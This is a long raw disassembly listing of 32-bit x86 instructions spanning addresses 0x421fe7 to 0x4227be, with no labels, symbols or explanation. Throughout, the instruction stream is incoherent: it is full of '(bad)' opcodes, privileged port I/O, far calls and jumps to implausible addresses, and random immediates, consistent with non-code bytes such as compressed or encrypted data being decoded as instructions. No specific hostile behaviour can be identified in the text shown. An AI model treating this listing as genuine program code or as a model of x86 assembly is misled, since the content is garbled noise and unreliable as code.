  421fe7:	and    DWORD PTR [edi],0xffffff95
  421fea:	adc    ebp,DWORD PTR [ecx]
  421fec:	inc    esp
  421fed:	pop    ebp
  421fee:	mov    dh,0x6e
  421ff0:	ja     0x421f72
  421ff2:	or     al,0x7e
  421ff4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421ff5:	cld    
  421ff6:	les    eax,FWORD PTR [esi+edx*8-0x1051609b]
  421ffd:	mov    edx,DWORD PTR [edx+0x53]
  422000:	pop    ebx
  422001:	pop    es
  422002:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  422004:	outs   dx,BYTE PTR ds:[esi]
  422005:	xchg   ecx,eax
  422006:	xchg   BYTE PTR [ebx+ecx*8+0x7493f530],bl
  42200d:	pusha  
  42200e:	bound  esp,QWORD PTR [edi+0x55]
  422011:	cmp    eax,0x4c8636c4
  422016:	jge    0x421faf
  422018:	jle    0x422083
  42201a:	mov    dl,0x56
  42201c:	and    esi,DWORD PTR [ebp-0x68084c6a]
  422022:	inc    ebp
  422023:	mov    edx,0x14791b65
  422028:	sar    BYTE PTR ds:0x3e6c6803,cl
  42202e:	call   0x1840e44f
  422033:	cmp    BYTE PTR [edx],dl
  422035:	adc    edi,esp
  422037:	stc    
  422038:	stc    
  422039:	fdivr  QWORD PTR [ebx]
  42203b:	sbb    al,0x6e
  42203d:	push   esp
  42203e:	inc    esp
  42203f:	add    eax,0x4ba47ac3
  422044:	lock js 0x422022
  422047:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422048:	js     0x422082
  42204a:	lds    ebp,FWORD PTR [edx-0x5c]
  42204d:	mov    ecx,0xf07df84a
  422052:	and    eax,0xfa5ccfe4
  422057:	xor    DWORD PTR [ebx+0x6],0x1afcd8b9
  42205e:	mov    ecx,DWORD PTR [edi-0x6c]
  422061:	orps   xmm5,xmm5
  422064:	dec    ebx
  422065:	cmp    bl,dl
  422067:	mov    ch,0xb2
  422069:	(bad)  
  42206a:	clc    
  42206b:	mov    ?,WORD PTR [ecx]
  42206d:	enter  0xb7c,0x4b
  422071:	pop    ss
  422072:	sti    
  422073:	or     BYTE PTR [ecx],dh
  422075:	jg     0x4220d4
  422077:	mov    bh,0xd0
  422079:	fadd   st,st(6)
  42207b:	dec    edi
  42207c:	lock inc ebx
  42207e:	in     eax,0xc9
  422080:	loope  0x4220b1
  422082:	rcl    al,1
  422084:	or     eax,DWORD PTR [eax+0x2af43097]
  42208a:	(bad)
  42208d:	cmp    eax,0x48fea9c
  422092:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422093:	(bad)  
  422094:	pop    esp
  422095:	sub    DWORD PTR [edi-0x60915bfc],edx
  42209b:	outs   dx,DWORD PTR ds:[esi]
  42209c:	(bad)  
  42209e:	mov    ch,BYTE PTR [ecx+0x2e]
  4220a1:	push   ebp
  4220a2:	rol    BYTE PTR [edx-0x8],cl
  4220a5:	(bad)  
  4220a6:	mov    esp,0xcb2e5e56
  4220ab:	fstp   TBYTE PTR [eax+0x3d]
  4220b1:	add    BYTE PTR [ecx],bh
  4220b3:	stc    
  4220b4:	pop    ebx
  4220b5:	sub    ebx,ebx
  4220b7:	stos   DWORD PTR es:[edi],eax
  4220b8:	jns    0x4220b5
  4220ba:	dec    edx
  4220bb:	sub    bl,0xe9
  4220be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4220bf:	jl     0x4220ee
  4220c1:	outs   dx,BYTE PTR ds:[esi]
  4220c2:	cdq    
  4220c3:	call   0x0:0x4f40001
  4220ca:	test   al,0xb8
  4220cc:	scas   al,BYTE PTR es:[edi]
  4220cd:	push   0xffffff96
  4220cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4220d0:	add    eax,0x501ee8c0
  4220d5:	mov    ebp,DWORD PTR [eax-0x3f415c15]
  4220db:	outs   dx,BYTE PTR ds:[esi]
  4220dc:	stos   DWORD PTR es:[edi],eax
  4220dd:	xor    bl,BYTE PTR [ebp+edx*1-0x42]
  4220e1:	push   es
  4220e2:	jns    0x4220e9
  4220e4:	sub    DWORD PTR [esi+0x17],ebp
  4220e7:	push   ecx
  4220e8:	shl    DWORD PTR [esi-0x5a99f8bc],cl
  4220ee:	fidivr DWORD PTR ds:0x261b863f
  4220f4:	mov    bl,0xa5
  4220f6:	cld    
  4220f7:	add    bh,BYTE PTR [ebp-0x5f]
  4220fa:	dec    esi
  4220fb:	add    eax,0x3f40d870
  422100:	or     DWORD PTR [eax],esp
  422102:	in     eax,0xc7
  422104:	fst    DWORD PTR [ebx-0x75d325d3]
  42210a:	push   eax
  42210b:	mov    ah,0x64
  42210d:	mov    ch,0xb0
  42210f:	inc    ecx
  422110:	leave  
  422111:	cmp    BYTE PTR [edi+eiz*4+0x4],al
  422115:	cli    
  422116:	sbb    BYTE PTR [esi],bh
  422118:	daa    
  422119:	lods   eax,DWORD PTR ds:[esi]
  42211a:	popf   
  42211b:	imul   ebp,ebx,0xffffff8c
  42211e:	or     al,0xad
  422120:	add    al,0xbb
  422122:	xor    bl,BYTE PTR [ebx+0x4b9c5544]
  422128:	fcmovnbe st,st(5)
  42212a:	ins    BYTE PTR es:[edi],dx
  42212b:	mov    esp,0x3383a649
  422130:	(bad)  
  422131:	mov    bh,0xff
  422133:	out    0x5,al
  422135:	test   al,0xf2
  422137:	mov    dh,0xa2
  422139:	add    al,0x0
  42213b:	pop    esp
  42213c:	lods   eax,DWORD PTR ds:[esi]
  42213d:	xchg   BYTE PTR [edx],ah
  42213f:	ror    DWORD PTR [ebx],1
  422141:	les    esi,FWORD PTR [ebp-0x4c]
  422144:	push   eax
  422145:	jmp    0x42213e
  422147:	mov    dh,0xf5
  422149:	mov    cl,0xf3
  42214b:	pop    eax
  42214c:	test   edx,0x3757a4c0
  422152:	(bad)  
  422153:	ins    BYTE PTR es:[edi],dx
  422154:	aad    0x47
  422156:	xchg   esi,eax
  422157:	lea    ebx,[ebp-0x21]
  42215a:	adc    esi,DWORD PTR [ebx]
  42215c:	mov    DWORD PTR [eax+0x74669961],esi
  422162:	test   bh,0x3f
  422165:	add    eax,0xf59e3644
  42216a:	mov    ebp,0xbf3b0a9b
  42216f:	pop    edi
  422170:	es js  0x4221a5
  422173:	mov    edi,0x5476828a
  422178:	sub    al,BYTE PTR [ebx]
  42217a:	mov    dl,0x4b
  42217c:	retf   
  42217d:	add    esi,edi
  42217f:	xlat   BYTE PTR ds:[ebx]
  422180:	jmp    0x4221d3
  422182:	pusha  
  422183:	inc    ebp
  422184:	jecxz  0x4221b1
  422186:	repz adc al,0x5c
  422189:	xor    ah,BYTE PTR [edi+eax*1+0x2d]
  42218d:	mov    bl,0xcc
  42218f:	jno    0x42219c
  422191:	cli    
  422192:	int3   
  422193:	jae    0x42216d
  422195:	push   es
  422196:	push   edi
  422197:	jno    0x42212b
  422199:	cli    
  42219a:	and    DWORD PTR [eax-0x1d],ebx
  42219d:	fcom   QWORD PTR [edi-0x419d1260]
  4221a3:	xchg   ecx,eax
  4221a4:	fwait
  4221a5:	(bad)  
  4221a6:	mov    ebx,0x9241d26
  4221ab:	inc    eax
  4221ac:	or     ch,BYTE PTR [ebx-0x6c821c08]
  4221b2:	cmp    cl,dl
  4221b4:	sub    ecx,DWORD PTR [ecx+ebp*4+0x30c16e88]
  4221bb:	cvtps2pd xmm5,xmm2
  4221be:	cbw    
  4221c0:	jle    0x42215b
  4221c2:	test   BYTE PTR [edi],cl
  4221c4:	mov    al,ds:0x51ccecae
  4221c9:	jp     0x4221e6
  4221cb:	jae    0x422157
  4221cd:	lods   al,BYTE PTR ds:[esi]
  4221ce:	les    esi,FWORD PTR [ecx+0x3f]
  4221d1:	inc    ebx
  4221d2:	fmul   st(7),st
  4221d4:	inc    edi
  4221d5:	mov    esi,0x82eb0228
  4221da:	in     al,dx
  4221db:	or     esp,DWORD PTR [eax+ebx*8+0x656c3f64]
  4221e2:	aaa    
  4221e3:	sub    edx,DWORD PTR [edi+0x3e]
  4221e6:	jmp    0xb4fb5d25
  4221eb:	or     ebp,DWORD PTR [edx-0x74325db1]
  4221f1:	test   eax,0x281090c7
  4221f6:	cmp    BYTE PTR [edi+ebx*2],al
  4221f9:	mov    esi,0x204e7b7b
  4221fe:	add    eax,DWORD PTR [edi+0x62]
  422201:	retf   0x19e9
  422204:	call   0x58a3:0x7d68f2dd
  42220b:	ins    DWORD PTR es:[edi],dx
  42220c:	inc    BYTE PTR [ebp+0x60]
  42220f:	(bad)  
  422210:	sbb    esp,ebp
  422212:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422213:	inc    ebp
  422214:	push   eax
  422215:	xchg   esp,eax
  422216:	xor    ch,BYTE PTR [ecx]
  422218:	or     eax,0x2b6d2c0c
  42221d:	cmovae ebp,DWORD PTR [ebp+0x23a53215]
  422224:	pop    edx
  422225:	fcomp  DWORD PTR [ecx+0x39da4d35]
  42222b:	jmp    0x17b23957
  422230:	rcl    BYTE PTR [ecx-0x36b48dee],0x0
  422237:	mov    ebp,0xe4036c37
  42223c:	adc    edx,DWORD PTR [edi-0xf]
  42223f:	int3   
  422240:	out    dx,al
  422241:	in     eax,dx
  422242:	test   eax,0x90045ee9
  422247:	push   ebx
  422248:	push   ebx
  422249:	leave  
  42224a:	daa    
  42224b:	aad    0x54
  42224d:	sahf   
  42224e:	repz push ebp
  422250:	(bad)
  422254:	jo     0x422268
  422256:	mov    ch,0x31
  422258:	add    eax,0xa6015a22
  42225d:	pop    esp
  42225e:	xchg   ebx,eax
  42225f:	push   ds
  422260:	les    esp,FWORD PTR [ebx+0x60cdd5c]
  422266:	cmp    al,0xd
  422268:	fild   QWORD PTR [edi+0x5b]
  42226b:	mov    eax,0xd3a94e2c
  422270:	js     0x4222db
  422272:	and    ebp,0x50dd2abe
  422278:	mov    edi,0x3e5ab506
  42227d:	int3   
  42227e:	stos   DWORD PTR es:[edi],eax
  42227f:	cmp    DWORD PTR [ebp+0xc],0xffffffc6
  422283:	mov    bl,0xdf
  422285:	sub    DWORD PTR [edx-0x36],esp
  422288:	xchg   esp,eax
  422289:	mov    esi,0x202962af
  42228e:	xor    cl,ch
  422290:	mov    dh,0x8c
  422292:	enter  0xd54a,0xaa
  422296:	daa    
  422297:	mov    al,0xcb
  422299:	dec    ebp
  42229a:	cld    
  42229b:	and    BYTE PTR [esi-0x3d02ef0a],0xde
  4222a2:	adc    al,0xac
  4222a4:	fs ins BYTE PTR es:[edi],dx
  4222a6:	jmp    0xc21ccd96
  4222ab:	xor    al,0x1b
  4222ad:	inc    edx
  4222ae:	(bad)  
  4222b0:	cmc    
  4222b1:	sti    
  4222b2:	mov    cl,0xcf
  4222b4:	lods   eax,DWORD PTR ds:[esi]
  4222b5:	ret    
  4222b6:	fcmovbe st,st(1)
  4222b8:	ja     0x422305
  4222ba:	mov    al,0x4
  4222bc:	aad    0x49
  4222be:	aas    
  4222bf:	mov    esp,0xca721a9d
  4222c4:	dec    edx
  4222c5:	jb     0x4222bb
  4222c7:	pop    ss
  4222c8:	and    al,0x4e
  4222ca:	push   esi
  4222cb:	adc    al,0xfa
  4222cd:	cmp    al,0xcf
  4222cf:	xor    DWORD PTR [esi],ecx
  4222d1:	add    ebx,DWORD PTR [esi+0x1f486a5f]
  4222d7:	push   ss
  4222d8:	adc    BYTE PTR [ecx-0x1a61b74e],dh
  4222de:	jmp    0x422345
  4222e0:	ja     0x42227b
  4222e2:	(bad)  
  4222e3:	mov    al,BYTE PTR [esi-0x5e6bf123]
  4222e9:	mov    cl,0x6c
  4222eb:	out    0x64,eax
  4222ed:	lds    esp,FWORD PTR [edi+0x1e33d5a]
  4222f3:	mov    eax,0xdd25994c
  4222f8:	push   ss
  4222f9:	sahf   
  4222fa:	imul   ebx,DWORD PTR [edx+0x2c],0x6e
  4222fe:	int    0x20
  422300:	ins    BYTE PTR es:[edi],dx
  422301:	aaa    
  422302:	test   edx,ebx
  422304:	mov    ds:0x4736823a,al
  422309:	bound  esi,QWORD PTR ds:0x2ee2f5d6
  42230f:	int    0xd1
  422311:	push   edx
  422312:	mov    edi,0xd731b1d9
  422317:	cld    
  422318:	mov    WORD PTR [ecx],es
  42231a:	mov    bh,0x77
  42231c:	test   DWORD PTR [ebx+0x4a57181c],ebx
  422322:	cs test al,0xa
  422325:	sti    
  422326:	inc    edi
  422327:	jae    0x422389
  422329:	sahf   
  42232a:	pop    ss
  42232b:	push   edx
  42232c:	popf   
  42232d:	add    DWORD PTR [esi],ebx
  42232f:	mov    al,ds:0x2e80e0f8
  422334:	cmp    edi,DWORD PTR [ebp-0x59]
  422337:	xor    eax,esp
  422339:	cmp    dl,BYTE PTR [ecx]
  42233b:	popa   
  42233c:	xchg   esi,eax
  42233d:	and    ah,bl
  42233f:	iret   
  422340:	xor    eax,0xdf39d282
  422345:	jg     0x4222f7
  422347:	and    edi,ecx
  422349:	add    bh,BYTE PTR [esi-0xe6d334]
  42234f:	arpl   cx,si
  422351:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422352:	or     eax,0x4ff4c11f
  422357:	jb     0x42234c
  422359:	adc    dl,cl
  42235b:	inc    eax
  42235c:	pop    ds
  42235d:	ret    0xc5db
  422360:	arpl   WORD PTR [esi-0x42a1e37a],di
  422366:	pop    esp
  422367:	xchg   esp,eax
  422368:	out    0x67,eax
  42236a:	test   DWORD PTR [ecx],ecx
  42236c:	repz push ss
  42236e:	or     eax,0x2ad908a2
  422373:	or     eax,0x904167c0
  422378:	icebp  
  422379:	hlt    
  42237a:	cmp    BYTE PTR [eax],dh
  42237c:	bound  ebp,QWORD PTR [ebp+0x3d]
  42237f:	add    eax,0x528c05be
  422384:	jno    0x422366
  422386:	and    BYTE PTR [esi+0x27c0964a],bl
  42238c:	cli    
  42238d:	mov    al,0x98
  42238f:	pusha  
  422390:	lock mov bh,BYTE PTR [esi+0x639cd57d]
  422397:	mov    dl,0x34
  422399:	mov    DWORD PTR [eax-0x6f],esp
  42239c:	push   ss
  42239d:	fild   DWORD PTR [edi-0xd]
  4223a0:	mov    esp,0x259e8216
  4223a5:	jge    0x422332
  4223a7:	push   es
  4223a8:	int    0x79
  4223aa:	in     al,0x4f
  4223ac:	inc    eax
  4223ad:	dec    edx
  4223ae:	sbb    ch,cl
  4223b0:	dec    esi
  4223b1:	ret    
  4223b2:	add    ecx,ecx
  4223b4:	dec    edx
  4223b5:	lods   al,BYTE PTR ds:[esi]
  4223b6:	push   edx
  4223b7:	jge    0x4223b3
  4223b9:	xchg   ebp,eax
  4223ba:	enter  0x2075,0x6c
  4223be:	jbe    0x422417
  4223c0:	fs sahf 
  4223c2:	div    ecx
  4223c4:	xchg   edx,eax
  4223c5:	mov    bl,0x5b
  4223c7:	ror    DWORD PTR [ebx-0x72c284b9],0xfe
  4223ce:	push   ss
  4223cf:	xchg   BYTE PTR [eax-0x50],dh
  4223d2:	and    BYTE PTR [esi],ah
  4223d4:	mov    edi,0xfb7a11de
  4223d9:	jno    0x4223cf
  4223db:	mov    dh,0x5c
  4223dd:	js     0x422410
  4223df:	scas   al,BYTE PTR es:[edi]
  4223e0:	cld    
  4223e1:	mov    ebx,0xe84000c4
  4223e6:	sub    DWORD PTR [edi+ebx*2],eax
  4223e9:	push   edx
  4223ea:	out    dx,al
  4223eb:	loope  0x42242f
  4223ed:	aam    0x35
  4223ef:	push   DWORD PTR [edx+0x7b7fa425]
  4223f5:	les    esp,FWORD PTR [ecx+0x1369401f]
  4223fb:	jb     0x422423
  4223fd:	push   esp
  4223fe:	inc    ebp
  4223ff:	std    
  422400:	jae    0x4223b6
  422402:	mov    bl,0x71
  422404:	dec    ecx
  422405:	jb     0x42246a
  422407:	imul   ebx
  422409:	jmp    0x4223ce
  42240b:	fwait
  42240c:	pop    ds
  42240d:	mov    ah,0x5a
  42240f:	adc    al,0xdb
  422411:	cmp    ah,0xcc
  422414:	xlat   BYTE PTR ds:[ebx]
  422415:	ja     0x422484
  422417:	sub    DWORD PTR [edx+edx*8],0xffffffd4
  42241b:	mov    ah,0x51
  42241d:	shl    BYTE PTR [ebp+0x66],1
  422420:	out    dx,al
  422421:	pop    es
  422422:	dec    eax
  422423:	push   ebx
  422424:	inc    edx
  422425:	or     ah,ah
  422427:	ret    
  422428:	xchg   DWORD PTR [eax+0x54b20584],ecx
  42242e:	div    BYTE PTR [ecx-0x5a]
  422431:	add    ecx,DWORD PTR es:[esi-0xa]
  422435:	push   cs
  422436:	mov    esi,0x360b657e
  42243b:	sbb    dh,dh
  42243d:	jnp    0x42249c
  42243f:	push   esi
  422440:	or     bh,ah
  422442:	ror    BYTE PTR ds:0xb72b7cd3,1
  422448:	dec    esp
  422449:	add    al,BYTE PTR [edi]
  42244b:	in     eax,dx
  42244c:	adc    eax,0x49bbe6c3
  422451:	inc    esi
  422452:	fmul   QWORD PTR [ebx]
  422454:	inc    esp
  422455:	mov    DWORD PTR [edx-0x43d9d627],ebx
  42245b:	sub    ch,BYTE PTR [edx+ebp*2]
  42245e:	xor    eax,0x26e4ebd4
  422463:	cmp    BYTE PTR [ebx+0x13],bh
  422466:	inc    edx
  422467:	(bad)  
  422469:	mov    ecx,0xe2b85d67
  42246e:	pop    eax
  42246f:	jmp    0x422429
  422471:	test   eax,0xfd2e9030
  422476:	rol    BYTE PTR [edx-0x29],1
  422479:	jl     0x42240a
  42247b:	enter  0x10,0x5e
  42247f:	push   ebx
  422480:	out    dx,al
  422481:	add    ecx,DWORD PTR [esi+0x5d]
  422484:	push   ebp
  422485:	mov    dh,0xf1
  422487:	aam    0xa3
  422489:	sahf   
  42248a:	xor    BYTE PTR [ecx+0x7f331633],0x9c
  422491:	lahf   
  422492:	nop
  422493:	sub    eax,0xb7d3a40b
  422498:	mov    ds:0x27c4f447,eax
  42249d:	mov    cl,0xdf
  42249f:	sub    al,0x9f
  4224a1:	pop    eax
  4224a2:	and    al,0xa
  4224a4:	xchg   edx,eax
  4224a5:	hlt    
  4224a6:	jmp    0x42246d
  4224a8:	mov    edx,0x98a13fa9
  4224ad:	sub    esp,edi
  4224af:	pop    eax
  4224b0:	dec    ebx
  4224b1:	jmp    0x4224a9
  4224b3:	je     0x422480
  4224b5:	lods   eax,DWORD PTR ds:[esi]
  4224b6:	sub    edx,ebp
  4224b8:	push   ds
  4224b9:	scas   eax,DWORD PTR es:[edi]
  4224ba:	sub    al,0xad
  4224bc:	mov    cl,0xe3
  4224be:	mov    dl,0x2a
  4224c0:	in     eax,dx
  4224c1:	or     BYTE PTR [eax+0x71d3307c],dh
  4224c7:	xchg   esp,eax
  4224c8:	or     eax,0x632b924e
  4224cd:	mov    ebx,DWORD PTR [ecx-0x17dc9724]
  4224d3:	mov    al,ds:0x565dd8ed
  4224d8:	pop    edx
  4224d9:	inc    ebx
  4224da:	leave  
  4224db:	and    BYTE PTR [esi-0x5b],bl
  4224de:	jg     0x42250f
  4224e0:	cmp    al,0x95
  4224e2:	ss adc al,0x98
  4224e5:	sub    al,0xb8
  4224e7:	retf   
  4224e8:	or     edi,esi
  4224ea:	push   eax
  4224eb:	and    eax,0xdd0a0b41
  4224f0:	add    al,0x64
  4224f2:	jge    0x422571
  4224f4:	int    0x86
  4224f6:	xor    eax,0xd74217ba
  4224fb:	clc    
  4224fc:	call   0x4db5bf15
  422501:	xchg   esi,eax
  422502:	fxch   st(2)
  422504:	inc    esp
  422505:	xchg   esp,eax
  422506:	shl    ebx,1
  422508:	cs push esp
  42250a:	push   edx
  42250b:	and    cl,BYTE PTR [eax+0x3]
  42250e:	jne    0x42249c
  422510:	add    cl,0xfd
  422513:	test   DWORD PTR [esi-0x78a65f0f],esi
  422519:	dec    edx
  42251a:	jo     0x4224c6
  42251c:	xchg   DWORD PTR [ecx+0x42],esp
  42251f:	pop    edi
  422520:	clc    
  422521:	sbb    dl,BYTE PTR cs:[ebx]
  422524:	sub    esp,ebp
  422526:	xor    DWORD PTR [edx+0x823c436],ebx
  42252c:	inc    ecx
  42252d:	jae    0x422567
  42252f:	sbb    edi,edi
  422531:	cmp    al,0x64
  422533:	es pop ds
  422535:	ja     0x42258c
  422537:	pop    ebx
  422538:	mov    esi,0x552ae64c
  42253d:	push   ecx
  42253e:	retf   0x7360
  422541:	shl    BYTE PTR [esp+eax*1],1
  422544:	(bad)  
  422545:	xchg   ebx,eax
  422546:	and    BYTE PTR [ebx],bh
  422548:	setp   BYTE PTR ds:0x80e54aa6
  42254f:	add    eax,0x8afd68b
  422554:	cld    
  422555:	add    eax,0x6cd8e0ed
  42255a:	test   ah,ch
  42255c:	ja     0x4225dc
  42255e:	js     0x4224fc
  422560:	inc    esp
  422561:	cmc    
  422562:	repnz pusha 
  422564:	mov    cs,WORD PTR [ecx+0x7d88b54d]
  42256a:	push   cs
  42256b:	ins    DWORD PTR es:[edi],dx
  42256c:	in     eax,0xda
  42256e:	xchg   ebp,eax
  42256f:	retf   0x2731
  422572:	stc    
  422573:	fsub   QWORD PTR ds:0x643161cb
  422579:	hlt    
  42257a:	shl    DWORD PTR [edi],1
  42257c:	xchg   ecx,eax
  42257d:	push   edx
  42257e:	dec    ebx
  42257f:	leave  
  422580:	pop    ebx
  422581:	ja     0x4225fd
  422583:	pop    ecx
  422584:	cmp    edx,DWORD PTR es:[edi+0x70660721]
  42258b:	cs ja  0x4225f7
  42258e:	sub    dh,BYTE PTR [edx-0x77]
  422591:	imul   esp,DWORD PTR [ecx-0x5b20f16a],0xa77073
  42259b:	mov    bl,ch
  42259d:	jae    0x4225b6
  42259f:	ins    DWORD PTR es:[edi],dx
  4225a0:	cs shl esp,cl
  4225a3:	std    
  4225a4:	jmp    0x8210:0x748ed022
  4225ab:	sbb    BYTE PTR [edi-0x724d8cc9],0x88
  4225b2:	cwde   
  4225b3:	gs cli 
  4225b5:	fild   WORD PTR [edx+0xd]
  4225b8:	adc    al,0x78
  4225ba:	popf   
  4225bb:	dec    edi
  4225bc:	retf   0x8b
  4225bf:	add    BYTE PTR [eax],al
  4225c1:	add    dl,cl
  4225c3:	adc    al,0x69
  4225c5:	dec    ecx
  4225c6:	(bad)  
  4225c7:	jge    0x4225b3
  4225c9:	xchg   edi,eax
  4225ca:	outs   dx,DWORD PTR ds:[esi]
  4225cb:	jge    0x422555
  4225cd:	call   0x9f8d:0x1154cd8c
  4225d4:	add    DWORD PTR [eax],eax
  4225d6:	hlt    
  4225d7:	add    al,0x0
  4225d9:	add    BYTE PTR [esi-0x5f],dl
  4225dc:	je     0x4225b0
  4225de:	scas   eax,DWORD PTR es:[edi]
  4225df:	pop    esp
  4225e0:	fist   DWORD PTR [edx+0x414ca012]
  4225e6:	cmc    
  4225e7:	xor    eax,0x69bf93e7
  4225ec:	xor    ebp,DWORD PTR [ecx-0x5675cb96]
  4225f2:	sub    DWORD PTR [edx+0x61],esp
  4225f5:	stos   BYTE PTR es:[edi],al
  4225f6:	nop
  4225f7:	shr    ebx,0x36
  4225fa:	or     al,0xda
  4225fc:	popa   
  4225fd:	xchg   esi,eax
  4225fe:	add    al,BYTE PTR [esi+ecx*1-0x6a]
  422602:	or     eax,0x14a10e3d
  422607:	jnp    0x422640
  422609:	adc    eax,0x8cf64077
  42260e:	mov    ds:0x338af680,eax
  422613:	mov    cl,0xe8
  422615:	mov    edx,0xc9d9cc01
  42261a:	sbb    dl,BYTE PTR [esi]
  42261c:	shr    BYTE PTR [edx+0x1272aa7e],0x2
  422623:	mov    DWORD PTR [ecx],edx
  422625:	push   eax
  422626:	xor    eax,0x3cbb557d
  42262b:	add    al,BYTE PTR [edi-0x17c241a6]
  422631:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422632:	mov    edi,DWORD PTR [esi-0x78a2fb26]
  422638:	into   
  422639:	fimul  DWORD PTR [eax*4-0x1972acc7]
  422640:	(bad)  
  422641:	mov    eax,0x60775d96
  422646:	repz add edi,ebx
  422649:	call   0x7fb25adc
  42264e:	out    dx,eax
  42264f:	push   0xffffffc5
  422651:	pop    ebp
  422652:	sbb    BYTE PTR [ecx+0x56],cl
  422655:	adc    al,0x70
  422657:	outs   dx,DWORD PTR ds:[esi]
  422658:	aaa    
  422659:	popf   
  42265a:	or     ebp,DWORD PTR [edx+0x76]
  42265d:	test   al,0xf0
  42265f:	test   BYTE PTR [di],ah
  422662:	and    dh,BYTE PTR [ecx-0x15f3c43b]
  422668:	hlt    
  422669:	ficomp DWORD PTR [ecx+eax*1]
  42266c:	test   DWORD PTR [ecx+0x2b],esp
  42266f:	sbb    bl,BYTE PTR [edx+0x1d964377]
  422675:	test   al,0x80
  422677:	retf   
  422678:	mov    edx,0xe8defe22
  42267d:	sar    BYTE PTR [eax],cl
  42267f:	je     0x4226fa
  422681:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422682:	rol    BYTE PTR [ebx],cl
  422684:	dec    ebx
  422685:	pop    esp
  422686:	add    BYTE PTR [ecx],ch
  422688:	add    BYTE PTR [edx-0x7de19247],bl
  42268e:	je     0x422675
  422690:	dec    eax
  422691:	jnp    0x422651
  422693:	adc    ebx,DWORD PTR [edx+0x4e]
  422696:	sar    DWORD PTR [esi-0x4bda7c84],0xe4
  42269d:	or     edx,esp
  42269f:	push   esi
  4226a0:	sbb    BYTE PTR [ebx],bh
  4226a2:	pop    eax
  4226a3:	test   BYTE PTR [esi+0x509bc5f3],dl
  4226a9:	lods   eax,DWORD PTR ds:[esi]
  4226aa:	mov    ah,0x26
  4226ac:	mov    dh,BYTE PTR [ecx]
  4226ae:	out    dx,eax
  4226af:	lahf   
  4226b0:	in     eax,0xd1
  4226b2:	dec    esi
  4226b3:	dec    esp
  4226b4:	retf   
  4226b5:	jecxz  0x42264b
  4226b7:	aam    0x8b
  4226b9:	lds    eax,FWORD PTR [ebx-0x554a09a1]
  4226bf:	mov    dl,0x9
  4226c1:	inc    edi
  4226c2:	and    BYTE PTR ds:0x8db98da0,ah
  4226c8:	mov    BYTE PTR ds:0x3717a71,al
  4226ce:	out    dx,eax
  4226cf:	xchg   ebx,eax
  4226d0:	leave  
  4226d1:	outs   dx,BYTE PTR ds:[esi]
  4226d2:	xor    BYTE PTR [edi+0x9a6dffe],0x55
  4226d9:	jno    0x422730
  4226db:	push   esi
  4226dc:	outs   dx,BYTE PTR ds:[esi]
  4226dd:	out    0x96,eax
  4226df:	jne    0x422760
  4226e1:	add    DWORD PTR [ecx-0x77],ebx
  4226e4:	mov    cl,0x83
  4226e6:	or     al,BYTE PTR [eax]
  4226e8:	test   esp,edi
  4226ea:	inc    esi
  4226eb:	std    
  4226ec:	ss gs std 
  4226ef:	push   esp
  4226f0:	daa    
  4226f1:	iret   
  4226f2:	sbb    ebx,eax
  4226f4:	ret    0x3865
  4226f7:	hlt    
  4226f8:	(bad)  
  4226f9:	je     0x42268b
  4226fb:	icebp  
  4226fc:	inc    ebp
  4226fd:	loopne 0x42272e
  4226ff:	lods   al,BYTE PTR ds:[esi]
  422700:	xor    DWORD PTR [edx+0x1b],0x6d
  422704:	daa    
  422705:	push   ecx
  422706:	test   DWORD PTR [ecx],0x5fbfc0fe
  42270c:	and    DWORD PTR [ecx-0x67],ebx
  42270f:	fwait
  422710:	daa    
  422711:	dec    esi
  422712:	xchg   BYTE PTR [ecx-0x5a57b98a],dl
  422718:	iret   
  422719:	std    
  42271a:	xchg   ecx,eax
  42271b:	xor    eax,0x4bccac27
  422720:	stos   BYTE PTR es:[edi],al
  422721:	(bad)  
  422722:	sti    
  422723:	mov    bl,0xc8
  422725:	fs jns 0x4227a3
  422728:	bound  eax,QWORD PTR [eax-0x6550335b]
  42272e:	pushf  
  42272f:	mov    ebp,0xee3bf849
  422734:	push   ss
  422735:	shl    BYTE PTR [ebx+0x1e],1
  422738:	cmp    DWORD PTR [eax-0x7c],esp
  42273b:	test   al,0x58
  42273d:	shld   eax,edi,cl
  422740:	push   cs
  422741:	and    al,0x9d
  422743:	mov    eax,ds:0xe6c61482
  422748:	or     ebx,ebx
  42274a:	add    DWORD PTR [ecx],eax
  42274c:	mov    ch,0x18
  42274e:	cmp    ah,dh
  422750:	mov    al,0x6b
  422752:	dec    esp
  422753:	gs ret 0xbfc0
  422757:	mov    dh,BYTE PTR [ecx-0x318b931b]
  42275d:	ja     0x422710
  42275f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422760:	cmc    
  422761:	dec    eax
  422762:	add    DWORD PTR [bx+0x6769],edx
  422767:	pop    es
  422768:	std    
  422769:	inc    ebp
  42276a:	and    al,BYTE PTR ds:0x31bba82d
  422770:	je     0x422740
  422772:	xor    al,0x6d
  422774:	jo     0x42274b
  422776:	add    eax,0x5e86403d
  42277b:	sub    ah,cl
  42277d:	imul   edx,esp,0x6f8cd84d
  422783:	and    esp,ebx
  422785:	cmp    eax,0xa18b11a9
  42278a:	ins    DWORD PTR es:[edi],dx
  42278b:	pop    esi
  42278c:	popf   
  42278d:	call   esp
  42278f:	fwait
  422790:	les    ebx,FWORD PTR [edi+0x23]
  422793:	fidivr DWORD PTR [ebx]
  422795:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422796:	adc    ebx,DWORD PTR [eax-0x656667f0]
  42279c:	retf   0xb891
  42279f:	push   esp
  4227a0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4227a1:	xor    bl,BYTE PTR [eax-0x41642a28]
  4227a7:	mov    edi,fs
  4227a9:	in     al,0x84
  4227ab:	aam    0xeb
  4227ad:	outs   dx,BYTE PTR ds:[esi]
  4227ae:	inc    ebx
  4227af:	jne    0x4227ce
  4227b1:	ds ja  0x422768
  4227b4:	sub    al,0xad
  4227b6:	xchg   BYTE PTR [ebx],dl
  4227b8:	es mov esi,0x1cf6a4e
  4227be:	xchg   ecx,eax
